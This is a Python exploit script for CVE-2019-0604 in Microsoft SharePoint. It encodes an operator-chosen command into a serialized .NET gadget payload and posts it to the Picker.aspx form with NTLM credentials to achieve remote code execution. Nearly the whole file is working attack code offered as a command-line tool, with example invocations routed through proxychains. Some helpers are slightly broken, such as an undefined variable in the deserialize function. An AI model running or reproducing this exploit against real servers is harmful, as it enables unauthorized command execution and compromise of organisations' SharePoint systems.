#!/usr/bin/python
from sys import argv, exit
from xml.sax.saxutils import escape
from lxml import html
from bs4 import BeautifulSoup
from pwn import *
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests_ntlm import HttpNtlmAuth
import argparse
import requests
import codecs

# pip install impacket elementflow bs4

context.log_level = 'info'


class Payload:
    picker_dialog_type = 'Microsoft.SharePoint.WebControls.ItemPickerDialog, Microsoft.SharePoint, Version={VERSION}.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c'
    picker_path = '/_layouts/15/Picker.aspx'
    payload_gadget = '__bp{SIZE}35009700370047005600d600e2004400160047001600e20035005600270067009600360056003700e2009400e600470056002700e6001600c600e2005400870007001600e600460056004600750027001600070007005600270006002300b500b50035009700370047005600d600e20075009600e6004600f60077003700e200d40016002700b60057000700e20085001600d600c600250056001600460056002700c200020005002700560037005600e6004700160047009600f600e600640027001600d60056007700f6002700b600c200020065005600270037009600f600e600d3004300e2000300e2000300e2000300c200020034005700c6004700570027005600d300e60056005700470027001600c600c2000200050057002600c60096003600b400560097004500f600b6005600e600d3003300130026006600330083005300630016004600330063004300560033005300d500c200b50035009700370047005600d600e20075009600e6004600f60077003700e2004400160047001600e200f4002600a600560036004700440016004700160005002700f60067009600460056002700c200020005002700560037005600e6004700160047009600f600e600640027001600d60056007700f6002700b600c200020065005600270037009600f600e600d3004300e2000300e2000300e2000300c200020034005700c6004700570027005600d300e60056005700470027001600c600c2000200050057002600c60096003600b400560097004500f600b6005600e600d3003300130026006600330083005300630016004600330063004300560033005300d500d500c200020035009700370047005600d600e2004400160047001600e20035005600270067009600360056003700c200020065005600270037009600f600e600d3004300e2000300e2000300e2000300c200020034005700c6004700570027005600d300e60056005700470027001600c600c2000200050057002600c60096003600b400560097004500f600b6005600e600d3002600730073001600530036005300630013009300330043005600030083009300a300c300f3008700d600c600020067005600270037009600f600e600d30022001300e2000300220002005600e6003600f60046009600e6007600d3002200570047006600d200130063002200f300e300d000a000c3005400870007001600e6004600560046007500270016000700070056002700f400660085001600d600c600250056001600460056002700f4002600a600560036004700440016004700160005002700f6006700960046005600270002008700d600c600e6003700a300870037009600d30022008600470047000700a300f200f200770077007700e20077003300e200f60027007600f2002300030003001300f2008500d400c4003500360086005600d6001600d2009600e600370047001600e60036005600220002008700d600c600e6003700a300870037004600d30022008600470047000700a300f200f200770077007700e20077003300e200f60027007600f2002300030003001300f2008500d400c4003500360086005600d60016002200e300d000a00002000200c30005002700f600a6005600360047005600460005002700f600070056002700470097000300e300d000a0000200020002000200c300f4002600a6005600360047009400e600370047001600e600360056000200870037009600a3004700970007005600d300220085001600d600c60025005600160046005600270022000200f200e300d000a0000200020002000200c300d400560047008600f6004600e4001600d6005600e30005001600270037005600c300f200d400560047008600f6004600e4001600d6005600e300d000a0000200020002000200c300d400560047008600f60046000500160027001600d60056004700560027003700e300d000a000020002000200020002000200c3001600e600970045009700070056000200870037009600a3004700970007005600d3002200870037004600a3003700470027009600e60076002200e3006200c6004700b300250056003700f600570027003600560044009600360047009600f600e60016002700970002008700d600c600e6003700d30072008600470047000700a300f200f2003700360086005600d60016003700e200d600960036002700f6003700f60066004700e2003600f600d600f20077009600e60066008700f2002300030003006300f20087001600d600c600f20007002700560037005600e6004700160047009600f600e600720002008700d600c600e6003700a3008700d30072008600470047000700a300f200f2003700360086005600d60016003700e200d600960036002700f6003700f60066004700e2003600f600d600f20077009600e60066008700f2002300030003006300f20087001600d600c600720002008700d600c600e6003700a30035009700370047005600d600d30072003600c6002700d200e6001600d600560037000700160036005600a30035009700370047005600d600b3001600370037005600d6002600c6009700d300d60037003600f6002700c60096002600720002008700d600c600e6003700a3004400960016007600d30072003600c6002700d200e6001600d600560037000700160036005600a30035009700370047005600d600e2004400960016007600e600f60037004700960036003700b3001600370037005600d6002600c6009700d30037009700370047005600d6007200620076004700b3006200c6004700b300f4002600a600560036004700440016004700160005002700f6006700960046005600270002008700a300b40056009700d3007200970072000200f4002600a6005600360047004500970007005600d3007200b7008700a300450097000700560002004400960016007600a30005002700f6003600560037003700d70072000200d400560047008600f6004600e4001600d6005600d3007200350047001600270047007200620076004700b3006200c6004700b300f4002600a600560036004700440016004700160005002700f60067009600460056002700e200d400560047008600f60046000500160027001600d60056004700560027003700620076004700b3006200c6004700b30035009700370047005600d600a3003500470027009600e6007600620076004700b3003600d60046006200c6004700b300f20035009700370047005600d600a3003500470027009600e6007600620076004700b3006200c6004700b30035009700370047005600d600a3003500470027009600e6007600620076004700b300f20036000200e200e200e200140024003400e200e200e20002006200c6004700b300f20035009700370047005600d600a3003500470027009600e6007600620076004700b3006200c6004700b300f200f4002600a600560036004700440016004700160005002700f60067009600460056002700e200d400560047008600f60046000500160027001600d60056004700560027003700620076004700b3006200c6004700b300f200f4002600a600560036004700440016004700160005002700f60067009600460056002700620076004700b3006200c6004700b300f200250056003700f600570027003600560044009600360047009600f600e600160027009700620076004700b3000200c300f2001600e60097004500970007005600e300d000a0000200020002000200c300f200d400560047008600f60046000500160027001600d60056004700560027003700e300d000a00002000200c300f20005002700f600a6005600360047005600460005002700f600070056002700470097000300e300d000a000c300f2005400870007001600e6004600560046007500270016000700070056002700f400660085001600d600c600250056001600460056002700f4002600a600560036004700440016004700160005002700f60067009600460056002700e300'
    version_2010 = '14'
    version_2013 = '15'
    version_2016 = '16'
    version_2019 = '16'
    version = '15'

    @staticmethod
    def serialize(cmd_input):
        cmd_output = ''
        for x in cmd_input:
            a = codecs.encode(x, 'utf-16be')
            b = codecs.encode(a, 'hex').decode('ascii')
            cmd_output += b[::-1]
        return cmd_output

    @staticmethod
    def deserialize(cmd_input):
        length = len(cmd_input)
        cmd_output = ''
        for i in range(0, length, 4):
            character = cmd[i]+cmd[i+1]+cmd[i+2]+cmd[i+3]
            character = character[::-1]
            c_hex = codecs.decode(character, 'hex')
            a = codecs.decode(c_hex, 'utf-16be')
            cmd_output += a
        return cmd_output

    def dialog(self):
        return self.picker_dialog_type.replace(
            '{VERSION}', self.version
        )

    def gadget(self, cmd_input):
        cmd_input = cmd_input.replace("&", "&")
        cmd_input = cmd_input.replace(">", ">")
        cmd_input = cmd_input.replace("<", "<")
        cmd_input = cmd_input.replace("\"", '"')
        cmd_input = cmd_input.replace("'", "&apos;")
        cmd_output = escape(cmd_input)
        cmd_gadget = self.serialize(cmd_output)
        length = 1448 + len(cmd_output)
        hex_length = format(length * 4, 'x')
        serialized_length = hex_length[::-1]
        payload = self.payload_gadget.replace('e200e200e200140024003400e200e200e200', cmd_gadget)
        return payload.replace('{SIZE}', serialized_length)


class Exploit:
    def __init__(
            self,
            redirect=False,
            proxy_address='',
            username='',
            domain='',
            password='',
            version='',
            target=''
    ):
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        self.username = '%s\\%s' % (domain, username)
        self.payload = Payload()
        self.payload.version = version \
            if version != '' \
            else self.payload.version
        self.target = target
        self.password = password
        self.session = requests.session()
        self.redirect = redirect
        self.timeout = 0.5
        self.proxies = {
            'http': 'http://%s' % proxy_address,
            'https': 'http://%s' % proxy_address
        } \
            if proxy_address is not None \
               and proxy_address != '' else {}
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)'
        }
        self.query_params = {
            'PickerDialogType': self.payload.dialog()
        }
        self.form_values = {
            '__REQUESTDIGEST': '',
            '__EVENTTARGET': '',
            '__EVENTARGUMENT': '',
            '__spPickerHasReturnValue': '',
            '__spPickerReturnValueHolder': '',
            '__VIEWSTATE': '',
            '__VIEWSTATEGENERATOR': '',
            'ctl00$PlaceHolderDialogBodySection$ctl07$queryTextBox': '',
            'ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData': '',
            'ctl00$PlaceHolderDialogBodySection$ctl05$OriginalEntities': '',
            'ctl00$PlaceHolderDialogBodySection$ctl05$HiddenEntityKey': '',
            'ctl00$PlaceHolderDialogBodySection$ctl05$HiddenEntityDisplayText': '',
            'ctl00$PlaceHolderDialogBodySection$ctl05$downlevelTextBox': '',
            '__CALLBACKID': '',
            '__CALLBACKPARAM': '',
            '__EVENTVALIDATION': ''
        }
        self.cookies = {}

    def do_get(self, url, params=None, data=None):
        return self.session.get(
            url=url,
            verify=False,
            allow_redirects=self.redirect,
            headers=self.headers,
            cookies=self.cookies,
            proxies=self.proxies,
            data=data,
            params=params,
            auth=HttpNtlmAuth(self.username, self.password)
        )

    def do_post(self, url, data=None, params=None):
        return self.session.post(
            url=url,
            data=data,
            verify=False,
            allow_redirects=self.redirect,
            headers=self.headers,
            cookies=self.cookies,
            proxies=self.proxies,
            params=params,
            auth=HttpNtlmAuth(self.username, self.password)
        )

    def parse_page(self, content):
        soup = BeautifulSoup(content, 'lxml')
        for key, val in self.form_values.iteritems():
            try:
                for tag in soup.select('input[name=%s]' % key):
                    try:
                        self.form_values[key] = tag['value']
                    except Exception as error:
                        log.debug('error for key %s error %s' % (key, str(error)))
            except Exception as error:
                log.debug('error for selector %s error %s' % (key, str(error)))
        return self

    def debug(self):
        try:
            import http.client as http_client
        except ImportError:
            import httplib as http_client
        http_client.HTTPConnection.debuglevel = 1
        logging.basicConfig()
        logging.getLogger().setLevel(logging.DEBUG)
        requests_log = logging.getLogger("requests.packages.urllib3")
        requests_log.setLevel(logging.DEBUG)
        requests_log.propagate = True
        return self

    def get_form(self):
        url = '%s%s' % (self.target, self.payload.picker_path)
        resp = self.do_get(url=url, params=self.query_params)
        self.parse_page(content=resp.content)
        return self

    def send_payload(self, command=''):
        self.form_values['ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData'] \
            = self.payload.gadget(cmd_input=command)
        url = '%s%s' % (self.target, self.payload.picker_path)
        resp = self.do_post(url=url, params=self.query_params, data=self.form_values)
        return resp


if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help=True, description='CVE-2019-0604 SharePoint exploit')
    try:
        parser.add_argument('-target', action='store', help='Target address: http(s)://target.com ')
        parser.add_argument('-command', action='store', help='Command to use: ping /n 10 8.8.8.8')
        parser.add_argument('-username', action='store', help='Username to use: first.last')
        parser.add_argument('-domain', action='store', help='User domain to use: domain.local')
        parser.add_argument('-password', action='store', help='Password to use: Summer2020')
        parser.add_argument('-version', action='store', default='2013', help='SharePoint version: 2010, 2013, 2016, 2019')
        parser.add_argument('-debug', action='store', default=False, help='Enable debugging: False')
        parser.add_argument('-proxy', action='store', default='', help='Enable proxy: 10.10.10.10:8080')

        if len(argv) == 1:
            parser.print_help()
            exit(1)
        options = parser.parse_args()

        # proxychains python sharepoint_cve-2019-0604.py -target=https://website.target.com -username=john.doe -domain=domain.local -password=Summer2020 -version=2013 -command='ping /n 10 10.9.8.1'
       
        target_version = ''
        if options.version == '2010':
            target_version = Payload.version_2010
        if options.version == '2013':
            target_version = Payload.version_2013
        if options.version == '2016':
            target_version = Payload.version_2016
        if options.version == '2019':
            target_version = Payload.version_2019

        exp = Exploit(
            proxy_address=options.proxy,
            username=options.username,
            domain=options.domain,
            password=options.password,
            target=options.target,
            version=target_version
        )

        if options.debug:
            context.log_level = 'debug'
            exp.debug()
            log.debug('target %s command %s username %s domain %s password %s debug %s proxy %s' % (
                options.target, options.command, options.username, options.domain, options.password, options.debug,
                options.proxy
            ))

        exp.get_form()
        response = exp.send_payload(command=options.command)
        log.success(response.content)

    except Exception as error:
        log.debug('error in main %s' % str(error))
        parser.print_help()
